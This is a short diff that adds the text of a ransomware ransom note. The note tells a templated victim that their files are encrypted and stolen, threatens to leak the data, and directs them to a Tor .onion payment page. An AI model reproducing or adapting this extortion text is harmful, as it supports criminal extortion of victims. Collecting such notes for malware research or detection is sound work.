@@ -1,0 +1,9 @@
+Dear %username%, your files were encrypted, some are compromised.
+Be sure, you can't restore it without our help.
+You need a private key that only we have.
+Contact us to reach an agreement or we will leak your black shit to media.
+You will need to download TOR Browser.
+After installation open this link and contact with support:
+http://lirncvjfmdhv6samxvvlohfqx7jklfxoxj7xn3fh7qeabs3taemdsdqd.onion/pay
+id=[snip]
+Be careful with your messages or you will never get your files back.
